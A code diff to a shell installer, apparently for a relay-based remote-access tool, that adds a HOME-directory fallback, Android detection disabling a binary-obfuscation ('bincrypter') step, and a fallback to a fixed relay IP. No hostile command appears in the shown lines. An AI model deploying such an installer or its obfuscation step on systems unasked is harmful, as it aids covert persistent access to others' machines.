@@ -952,7 +952,8 @@ init_vars()
 		WARN "HOME not set. Using HOME=$HOME"
 	}
 	[ ! -d "$HOME" ] && {
-		phome="$(pwd)"
+		phome="$(cd;pwd)"
+		[ ! -d "$phome" ] && phome="$(pwd)"
 		WARN "HOME=$HOME not found. Using HOME=$phome"
 		HOME="$phome"
 	}
@@ -1077,6 +1078,14 @@ init_vars()
 	# Test that shell is a good shell.
 	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
 
+	command -v getprop >/dev/null && getprop &>/dev/null && {
+		IS_ANDROID=1
+		# On Android bincrypter wont work:
+		# - exec(/proc/self/fd/3) fails
+		# - bad syscall will send SIGSYS and then SIGKILL (seccomp).
+		# FIXME: Have a fallback in bincrypter to work if perl's exec fails (use /dev/shm or /tmp)
+		GS_NOBC=1
+	}
 	# Check that the resolver is working at the time of installation:
 	[ -z "$GS_HOST" ] && {
 		unset str
@@ -1092,7 +1101,8 @@ init_vars()
 		# If resolver is not working then use GS_HOST_MASTER_IP
 		[ -z "$str" ] && GS_HOST="${GS_HOST_MASTER_IP}"
 		# Musl's static resolver _will fail_ on Android. Use static IP instead:
-		[ -z "$GS_HOST" ] && command -v getprop >/dev/null && getprop &>/dev/null && GS_HOST="${GS_HOST_MASTER_IP}"
+		[ -z "$GS_HOST" ] && [ -n "$IS_ANDROID" ] && GS_HOST="${GS_HOST_MASTER_IP}"
+		export GS_HOST
 	}
 
 	DEBUGF "DL=${DL[*]}"
